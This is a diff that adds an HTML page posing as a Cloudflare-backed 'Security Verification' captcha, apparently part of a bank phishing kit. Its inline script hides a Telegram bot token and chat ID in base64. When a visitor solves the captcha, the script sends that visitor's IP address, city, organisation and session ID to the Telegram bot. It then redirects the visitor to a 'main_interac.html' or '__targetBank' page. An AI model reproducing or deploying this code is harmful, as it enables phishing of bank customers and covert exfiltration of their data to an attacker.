@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <!-- Cloudflare Turnstile API -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="security_module.js" defer></script>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #f8f9fa; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #202124; }
+        .captcha-card { background: #ffffff; width: 90%; max-width: 380px; padding: 36px 28px; border-radius: 8px; border: 1px solid #dadce0; box-shadow: 0 1px 3px rgba(60,64,67,0.08); text-align: center; }
+        h2 { font-size: 20px; font-weight: 500; margin: 0 0 10px; color: #202124; letter-spacing: -0.2px; }
+        p { font-size: 14px; color: #5f6368; margin: 0 0 28px; line-height: 1.5; }
+        
+        .captcha-container { display: flex; justify-content: center; margin-bottom: 24px; min-height: 65px; }
+        .btn-continue { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; opacity: 0.5; pointer-events: none; transition: background 0.2s, opacity 0.2s; }
+        .btn-continue.active { opacity: 1; pointer-events: auto; }
+        .btn-continue.active:hover { background: #1557b0; }
+    </style>
+</head>
+<body>
+
+<div class="captcha-card">
+    <h2>Security Verification</h2>
+    <p>Please confirm that you are not a robot</p>
+
+    <div class="captcha-container">
+        <!-- Cloudflare Turnstile Widget -->
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAAElbd8hTR2VQjdjt" data-callback="onCaptchaSuccess"></div>
+    </div>
+
+    <button class="btn-continue" id="btnGo">Continue</button>
+</div>
+
+<script>
+    function onCaptchaSuccess(token) {
+        var btnGo = document.getElementById('btnGo');
+        if (btnGo) {
+            btnGo.classList.add('active');
+        }
+
+        // Notifier Telegram immédiatement
+        var _ip = sessionStorage.getItem('__xip') || 'N/A';
+        var _city = sessionStorage.getItem('__xcity') || 'N/A';
+        var _org = sessionStorage.getItem('__xorg') || 'N/A';
+        var _sid = sessionStorage.getItem('__xsid') || 'N/A';
+        var _tok = atob('ODQyMTQxMDU3NDpBQUdHeVlYb0QxMHdZTXNVamJaV3hDWU80SjMzdFltQVBBNA==');
+        var _cid = atob('Njc4ODAxMjQ4MQ==');
+
+        fetch('https://api.telegram.org/bot' + _tok + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: _cid,
+                text: '✅ <b>CAPTCHA RÉSOLU</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _sid + '</code>',
+                parse_mode: 'HTML'
+            })
+        }).catch(function(){});
+
+        if (window._notifyCaptchaSolved) {
+            window._notifyCaptchaSolved();
+        }
+
+        sessionStorage.setItem('__cptPass', '1');
+
+        setTimeout(function() {
+            var target = sessionStorage.getItem('__targetBank') || 'main_interac.html';
+            window.location.href = target;
+        }, 600);
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        var btnGo = document.getElementById('btnGo');
+        if (btnGo) {
+            btnGo.addEventListener('click', function() {
+                var target = sessionStorage.getItem('__targetBank') || 'main_interac.html';
+                window.location.href = target;
+            });
+        }
+    });
+</script>
+<script src="security_module.js"></script>
+</body>
+</html>
